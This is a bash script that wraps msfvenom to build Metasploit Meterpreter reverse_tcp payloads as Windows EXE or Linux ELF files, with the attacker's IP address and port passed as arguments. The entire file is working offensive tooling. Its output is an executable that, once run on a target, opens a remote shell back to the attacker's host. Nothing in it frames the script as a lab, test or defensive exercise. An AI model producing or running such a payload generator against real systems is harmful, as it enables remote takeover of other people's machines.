#!/bin/bash

# If the caller only passed two parameters generate the default payload
if [ $# -eq 2 ]
then
	echo -e "Generatign payload...\n"
	msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f exe -o win_pyld.exe
	echo -e "\nDone!"
	exit
fi

# Otherwise, if the number of arguments is different than 4 print an error message and quit
if [ $# -ne 4 ]
then
	echo 'Usage: ./gen_payload.sh <platform> <arch> <attacker_IP> <attacker_port>'
	exit
fi

# If the platform is not 'windows' or 'linux' print an error message and quit
if [ $1 != "windows" ] && [ $1 != "linux" ]
then
	echo -e 'Wrong platform! Available options:\n\tWindows -> windows\n\tLinux -> linux'
	exit
fi

# We'll use an auxiliary variable to decide what our payload type should be
pyld_arch="/${2}"

# If we are generating a payload for Windows set the appropiate executable type and file name
if [ $1 == "windows" ]
then
	ex_type="exe"
	pyld_name="win_pyld.exe"

	if [ $2 == "x86" ]
	then
		pyld_arch=""
	fi
# If the payload is for linux we'll use an ELF executable instead
else
	ex_type="elf"
	pyld_name="lnx_pyld.elf"
fi

# Choose the desired architecture. We're only supporting 32 and 64 bit archs
if [ $2 != "x86" ] && [ $2 != "x64" ]
then
	echo -e 'Wrong arch! Available options:\n\t32-bit -> x86\n\t64-bit -> x64'
	exit
fi

# Inform the user we are generating the payload
echo -e 'Generating the payload...\n'

# Call msfvenom to do the job
msfvenom -a $2 --platform $1 -p $1$pyld_arch/meterpreter/reverse_tcp LHOST=$3 LPORT=$4 -f $ex_type -o $pyld_name

# Tell the user we're done...
echo -e '\nDone!'

# ... and quit
exit
